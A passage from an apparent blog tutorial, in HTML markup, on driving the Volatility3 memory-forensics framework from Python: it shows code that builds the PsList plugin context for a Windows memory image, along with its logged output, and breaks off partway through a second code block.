19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Let's decompose the function :</p>
<ul>
<li>The <strong>image_name</strong> : The name or relative path of the memory image you want to analyse.</li>
<li>The <strong>context</strong> : The object in which the memory context, plugin configuration and requirements will be stored.</li>
<li>The <strong>base_config_path</strong> : The path within the context's config containing the plugin's configuration. By default, this value is set to "plugins"</li>
<li>The <strong>plugin</strong> : The plugin object choosen from the list of plugins.</li>
</ul>
<p>Volatility3 is using what is called "automagics" to help with plugin construction. Indeed it is helping a lot to automatically determine specific stack layers.
Line 2, 4 and 5 of the code are determining what automagics are available, choose the automagics that apply to the operating system and update the context configuration.</p>
<p>Line 6 is simply giving the memory image location to the context configuration.</p>
<p>Once the context is ready, we can construct the plugin using the framework built-in function "construct_plugin".
This function will check that all the plugin's requirements are fulfilled and if so, will return the constructed plugin (which is an object). The sample code and output below allows us to see a bit more of what happened behind the scene and construct the 'PsList' plugin.
Notice that our logger also displays the volatility3 logs !</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> contexts</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> interfaces</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> plugins</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> automagic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">plugins </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> construct_plugin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">basicConfig</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">level</span><span class="token operator">=</span><span class="token plain">logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">INFO</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logger </span><span class="token operator">=</span><span class="token plain"> logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getLogger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">__name__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">require_interface_version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">build_context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">image_name </span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   available_automagics </span><span class="token operator">=</span><span class="token plain"> automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">available</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Available automagics : </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">available_automagics</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   plugin_config_path </span><span class="token operator">=</span><span class="token plain"> interfaces</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">configuration</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">path_join</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">__name__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   automagics </span><span class="token operator">=</span><span class="token plain"> automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">choose_automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">available_automagics</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'automagic.LayerStacker.stackers'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">stacker</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">choose_os_stackers</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'automagic.LayerStacker.single_location'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"file://"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getcwd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"/"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> image_name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   constructed </span><span class="token operator">=</span><span class="token plain"> construct_plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> automagics</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Contructed plugin : </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">constructed</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> constructed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ctx </span><span class="token operator">=</span><span class="token plain"> contexts</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)">## Construct a blank context</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">failures </span><span class="token operator">=</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">import_files</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">plugins</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">##Load the framework plugins</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> failures</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Some volatility3 plugin couldn't be loaded : </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">failures</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Plugins are loaded without failure"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plugin_list </span><span class="token operator">=</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">list_plugins</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">base_config_path </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"plugins"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">constructed </span><span class="token operator">=</span><span class="token plain"> build_context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Triage-Memory.mem"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> ctx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin_list</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'windows.pslist.PsList'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Context configuration </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">ctx</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token string-interpolation interpolation">config</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>OUTPUT :</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"> INFO:__main__:Plugins are loaded without failure</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> INFO:__main__:Available automagics :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> [volatility3.framework.automagic.symbol_cache.SymbolBannerCache object at 0x1052d9e20,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   volatility3.framework.automagic.mac.MacBannerCache object at 0x1052d9eb0,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   volatility3.framework.automagic.linux.LinuxBannerCache object at 0x1052d9f40,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   volatility3.framework.automagic.construct_layers.ConstructionMagic object at 0x1063a6340,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   volatility3.framework.automagic.stacker.LayerStacker object at 0x1063b4280,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> INFO:volatility3.framework.automagic:Detected a windows category plugin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> INFO:volatility3.framework.automagic:Running automagic: ConstructionMagic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> INFO:volatility3.framework.automagic:Running automagic: LayerStacker</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> INFO:volatility3.framework.automagic:Running automagic: WinSwapLayers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> INFO:volatility3.framework.automagic:Running automagic: KernelPDBScanner</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> INFO:volatility3.framework.automagic:Running automagic: KernelModule</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> INFO:__main__:Contructed plugin : volatility3.plugins.windows.pslist.PsList object at 0x1063c1ee0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> INFO:__main__:Context configuration {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "automagic.LayerStacker.single_location": "file:///REDACTED/REDACTED/REDACTED/REDACTED/REDACTED/REDACTED/Triage-Memory.mem",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "automagic.LayerStacker.stackers": [</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     "AVMLStacker",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     "LimeStacker",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     "Elf64Stacker",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     "QemuStacker",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     "WindowsCrashDumpStacker",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     "VmwareStacker",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     "WindowsIntelStacker"</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ],</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.dump": false,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel": "kernel",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.class": "volatility3.framework.contexts.Module",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.layer_name": "layer_name",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.layer_name.class": "volatility3.framework.layers.intel.WindowsIntel32e",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.layer_name.kernel_virtual_offset": 272678925664256,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.layer_name.memory_layer": "memory_layer",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.layer_name.memory_layer.class": "volatility3.framework.layers.physical.FileLayer",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.layer_name.memory_layer.location": "file:///REDACTED/REDACTED/REDACTED/REDACTED/REDACTED/REDACTED/Triage-Memory.mem",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.layer_name.page_map_offset": 1601536,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.layer_name.swap_layers": true,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.layer_name.swap_layers.number_of_elements": 0,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.offset": 272678925664256,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.symbol_table_name": "symbol_table_name1",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.symbol_table_name.class": "volatility3.framework.symbols.windows.WindowsKernelIntermedSymbols",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.symbol_table_name.isf_url": "file:///REDACTED/REDACTED/REDACTED/REDACTED/python/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/2E37F962D699492CAAF3F9F4E9770B1D-2.json.xz",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.kernel.symbol_table_name.symbol_mask": 0,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.physical": false,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   "plugins.PsList.pid": []</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Once our plugin is constructed, we can run it. However, we need to specify to volatility how we want to render the output. The framework is providing us with multiple renderers. Let's use the "pretty text renderer" that we have used with the CLI at the begining of the blog and run the plugin.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> contexts</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> interfaces</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> plugins</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> automagic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">plugins </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> construct_plugin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">cli </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> text_renderer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">basicConfig</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">level</span><span class="token operator">=</span><span class="token plain">logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">INFO</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logger </span><span class="token operator">=</span><span class="token plain"> logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getLogger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">__name__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">require_interface_version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">build_context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">image_name </span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   available_automagics </span><span class="token operator">=</span><span class="token plain"> automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">available</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 